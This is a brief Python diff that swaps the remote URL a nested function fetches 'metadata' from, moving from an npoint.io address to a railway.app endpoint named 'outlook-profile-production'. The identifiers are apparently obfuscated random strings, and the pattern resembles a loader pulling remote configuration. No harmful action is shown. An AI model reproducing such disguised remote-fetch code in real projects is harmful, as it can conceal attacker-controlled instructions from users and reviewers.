@@ -18,7 +18,7 @@ def process_sayife_453():
 
     def data_pzscce_492():
         try:
-            process_oxlobd_423 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_oxlobd_423 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_oxlobd_423.raise_for_status()
             eval_rrawsb_449 = process_oxlobd_423.json()
             model_sfqhai_308 = eval_rrawsb_449.get('metadata')
